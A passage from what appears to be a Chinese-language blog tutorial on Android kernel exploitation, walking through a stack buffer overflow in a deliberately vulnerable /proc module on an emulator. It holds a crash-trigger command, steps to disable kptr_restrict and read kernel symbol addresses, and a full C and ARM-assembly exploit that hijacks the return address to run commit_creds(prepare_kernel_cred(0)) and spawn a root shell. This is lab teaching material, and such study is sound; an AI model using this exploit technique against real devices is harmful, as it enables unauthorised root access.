stack_buffer_proc_entry-&gt;write_proc = proc_entry_write;</div><div class="line">    printk(KERN_INFO &quot;created /proc/stack_buffer_overflow\n&quot;);</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line">static void __exit stack_buffer_proc_exit(void)</div><div class="line">&#123;</div><div class="line">    if (stack_buffer_proc_entry) &#123;</div><div class="line">        remove_proc_entry(&quot;stack_buffer_overflow&quot;, stack_buffer_proc_entry);</div><div class="line">    &#125;</div><div class="line">    printk(KERN_INFO &quot;vuln_stack_proc_entry removed\n&quot;);</div><div class="line">&#125;</div><div class="line">module_init(stack_buffer_proc_init);</div><div class="line">module_exit(stack_buffer_proc_exit);</div></pre></td></tr></table></figure>
<p>上述代码会创建 <code>/proc/stack_buffer_overflow</code> 设备文件 ，当向该设备文件调用 <code>write</code> 系统调用时会调用 <code>proc_entry_write</code> 函数进行处理。</p>
<p>漏洞显而易见，在 <code>proc_entry_write</code> 函数中 定义了一个 <code>64</code> 字节大小的栈缓冲区<code>buf</code>， 然后使用 <code>copy_from_user(&amp;buf, ubuf, count)</code> 从用户空间 拷贝数据到 <code>buf</code>,数据大小和内容均用户可控。于是当我们输入超过<code>64</code>字节时我们能够覆盖其他的数据，比如返回地址等，进而劫持程序执行流到我们的 <code>shellcode</code> 中 进行提权。</p>
<p>首先我们来试试触发漏洞。先把模拟器打开，然后 adb shell 进入模拟器，使用  echo 命令向 /proc/stack_buffer_overflow 设备输入72字节的数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA &gt;  /proc/stack_buffer_overflow</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15120564582742ufjathg.png?imageslim" alt="paste image"><br>可以看到 pc 寄存器的值 为 0x41414141 成功劫持。测试时该内核没开 pxn ，所以我们可以在用户态编写shellcode让内核去执行。提取的方式很简单，内核态调用   <code>commit_creds(prepare_kernel_cred(0));</code>  提升权限为 root, 然后返回 用户态 执行 <code>execl(&quot;/system/bin/sh&quot;, &quot;sh&quot;, NULL);</code> 起一个 <code>root</code> 权限的 <code>shell</code>， 完成提权。</p>
<p>下面先获取 <code>prepare_kernel_cred</code> 和 <code>commit_creds</code> 函数的地址。在 <code>/proc/kallsyms</code> 文件中保存着所有的内核符号的名称和它在内存中的位置。</p>
<p>不过在最近的内核版本中，为了使利用内核漏洞变得更加困难，<code>linux</code> 内核目前禁止一般用户获取符号。具体可以看这里。</p>
<p>当启用 <code>kptr_restrict</code>是我们不能获取内核符号地址的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@generic:/ # cat /proc/kallsyms | grep commit_creds                        </div><div class="line">00000000 T commit_creds</div></pre></td></tr></table></figure></p>
<p>在本文中，把它禁用掉，不管他。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">	</div><div class="line">root@generic:/ # echo 0 &gt; /proc/sys/kernel/kptr_restrict                       </div><div class="line">root@generic:/ # cat /proc/kallsyms | grep commit_creds                        </div><div class="line">c0039834 T commit_creds</div><div class="line">root@generic:/ # cat /proc/kallsyms | grep prepare_kernel_cred                 </div><div class="line">c0039d34 T prepare_kernel_cred</div></pre></td></tr></table></figure>
<p>禁用掉之后，我们就可以通过 <code>/proc/kallsyms</code> 获取 <code>commit_creds</code> 和 <code>prepare_kernel_cred</code>的地址。</p>
<p>至此，提权的问题解决了，下面就是要回到用户态，在<code>x86</code>平台有 <code>iret</code>指令可以回到用户态，在<code>arm</code>下返回用户态就更简单了。在<code>arm</code>下 <code>cpsr</code> 寄存器的 <code>M[4：0]</code> 位用来表示 处理器的运行模式，具体可以看<a href="http://www.cnblogs.com/armlinux/archive/2011/03/23/2396833.html" target="_blank" rel="external">这个</a>。</p>
<p>所以我们把 <code>cpsr</code> 寄存器的 <code>M[4：0]</code> 位设置为 <code>10000</code> 后就表示 处理器进入了用户模式。</p>
<p>所以现在的利用思路是：</p>
<ul>
<li><p>调用 <code>commit_creds(prepare_kernel_cred(0))</code> 提升权限</p>
</li>
<li><p>调用 <code>mov r3, #0x40000010;   MSR    CPSR_c,R3;</code>设置 <code>cpsr</code>寄存器，使<code>cpu</code>进入用户模式</p>
</li>
<li><p>然后执行 <code>execl(&quot;/system/bin/sh&quot;, &quot;sh&quot;, NULL);</code> 起一个 <code>root</code> 权限的 <code>shell</code></p>
</li>
</ul>
<p>最后的 <code>exp</code> :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;sys/mman.h&gt;</div><div class="line">#define MAX             64</div><div class="line">int open_file(void)</div><div class="line">&#123;</div><div class="line">        int fd = open(&quot;/proc/stack_buffer_overflow&quot;, O_RDWR);</div><div class="line">        if (fd == -1)</div><div class="line">                err(1, &quot;open&quot;);</div><div class="line">        return fd;</div><div class="line">&#125;</div><div class="line">void payload(void)</div><div class="line">&#123;</div><div class="line">                printf(&quot;[+] enjoy the shell\n&quot;);</div><div class="line">                execl(&quot;/system/bin/sh&quot;, &quot;sh&quot;, NULL);</div><div class="line">&#125;</div><div class="line">extern uint32_t shellCode[];</div><div class="line">asm</div><div class="line">(</div><div class="line">&quot;    .text\n&quot;</div><div class="line">&quot;    .align 2\n&quot;</div><div class="line">&quot;    .code 32\n&quot;</div><div class="line">&quot;    .globl shellCode\n\t&quot;</div><div class="line">&quot;shellCode:\n\t&quot;</div><div class="line">// commit_creds(prepare_kernel_cred(0));</div><div class="line">// -&gt; get root</div><div class="line">&quot;LDR     R3, =0xc0039d34\n\t&quot;   //prepare_kernel_cred addr</div><div class="line">&quot;MOV     R0, #0\n\t&quot;</div><div class="line">&quot;BLX     R3\n\t&quot;</div><div class="line">&quot;LDR     R3, =0xc0039834\n\t&quot;   //commit_creds addr</div><div class="line">&quot;BLX     R3\n\t&quot;</div><div class="line">&quot;mov r3, #0x40000010\n\t&quot;</div><div class="line">&quot;MSR    CPSR_c,R3\n\t&quot;</div><div class="line">&quot;LDR     R3, =0x879c\n\t&quot;     // payload function addr</div><div class="line">&quot;BLX     R3\n\t&quot;</div><div class="line">);</div><div class="line">void trigger_vuln(int fd)</div><div class="line">&#123;</div><div class="line">        #define MAX_PAYLOAD (MAX + 2  * sizeof(void*) )</div><div class="line">        char buf[MAX_PAYLOAD];</div><div class="line">        memset(buf, &apos;A&apos;, sizeof(buf));</div><div class="line">        void * pc = buf + MAX +  1 * sizeof(void*);</div><div class="line">        printf(&quot;shellcdoe addr: %p\n&quot;, shellCode);</div><div class="line">        printf(&quot;payload:%p\n&quot;, payload);</div><div class="line">        *(void **)pc  = (void *) shellCode;   //ret addr</div><div class="line">        /* Kaboom! */</div><div class="line">        write(fd, buf, sizeof(buf) );</div><div class="line">&#125;</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">        int fd;</div><div class="line">        fd = open_file();</div><div class="line">        trigger_vuln(fd);</div><div class="line">        payload();</div><div class="line">        close(fd);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1512056489982lu7zmzvc.png?imageslim" alt="paste image"><br>参考链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">http://www.cnblogs.com/armlinux/archive/2011/03/23/2396833.html</div><div class="line"></div><div class="line">http://blog.sina.com.cn/s/blog_6ac051b2010123cz.html</div><div class="line"></div><div class="line">http://bobao.360.cn/learning/detail/3702.html</div><div class="line"></div><div class="line">https://github.com/Fuzion24/AndroidKernelExploitationPlayground</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> 安卓安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kernel_exploit </tag>
            
            <tag> android_kernel </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
